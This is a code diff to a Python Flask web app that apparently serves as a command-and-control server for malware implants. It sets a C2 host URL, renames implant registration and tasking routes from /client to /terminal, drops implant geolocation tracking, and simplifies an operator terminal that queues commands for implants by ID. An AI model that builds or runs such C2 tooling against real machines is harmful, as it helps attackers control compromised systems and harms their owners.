@@ -12,12 +12,12 @@ from cvnt.db_operations import make_task, get_list, get_implant_by_id
 
 term = Blueprint('terminal', __name__, template_folder='templates')
 c2 = "https://rigmalwarole.com"
-task_list = "/client/task/list"
-task_create = "/client/task/create"
-register = "/client/register"
-request = "/client/request"
-response = "/client/response"
-packet = "/client/packet"
+task_list = "/terminal/task/list"
+task_create = "/terminal/task/create"
+register = "/terminal/register"
+request = "/terminal/request"
+response = "/terminal/response"
+packet = "/terminal/packet"
 
 import random
 
@@ -29,30 +29,25 @@ def index():
     form = Terminal()
     if 'authenticated' not in session or not session['authenticated']:
         return redirect(url_for('basic.login_success'))
-    # Fetch latitude and longitude values from your Flask app
     implants = get_list()
-    implant_coordinates = [(get_implant_by_id(implant).latitude, get_implant_by_id(implant).longitude, get_implant_by_id(implant).implant_id) for implant in implants]
     whole = None
-    response = '' 
+    response = None 
     rest_string = ' '
     if form.validate_on_submit():
         whole = form.cmd.data
         words = whole.split()
         if len(words) == 1:
             if words[0] in server_commands:
-                implants = get_list()
-                for impl in implants:
-                    print(impl)
-                    curr = get_implant_by_id(impl)
-                    response += " " + curr.implant_id
-            else: 
+                print('printing??????')
+                response = get_list()
+            else:
                 response = 'Invalid Command Loser :('
                 cmd = words[0]
         elif len(words) == 2:
             if words[1] in opcodes:
                 implant_id = words[0]
                 cmd = words[1]
-                response = handle_task_request(implant_id, cmd, rest_string)
+                handle_task_request(implant_id, cmd, rest_string)
             else:
                 response = 'Invalid Command Loser :('
                 cmd = ' '.join(words)
@@ -63,20 +58,20 @@ def index():
                 cmd = first_two_words[1]
                 rest_of_words = words[2:]
                 rest_string = ' '.join(rest_of_words)
-                response =  handle_task_request(implant_id, cmd, rest_string)
+                handle_task_request(implant_id, cmd, rest_string)
             else:
                 response = 'Invalid Command Loser :('  # Set the error message
                 cmd = ' '.join(words)
-    return render_template('terminal.html', form=form, cmd=whole, implant_coordinates=implant_coordinates, response=response)
+    return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)
 
 def analyze_input(cmd, args):
     pass
 
 def handle_local_request(cmd, args):
     pass
+    
 
-
-@term.route('/client/task/request', methods=["POST"])
+@term.route('/terminal/task/request', methods=["POST"])
 def handle_task_request(implant_id, cmd, args):
     tr = TaskRequest()
     print(f'REQUEST FROM CLIENT')
@@ -90,7 +85,7 @@ def handle_task_request(implant_id, cmd, args):
     print("added task")
     db.session.commit()
     print("committed task")
-    return jsonify({"response": "Task request received."})
+    return "True"
 
 @term.route(response, methods=["POST"])
 def handle_t_response(implant_id, jobID, output):
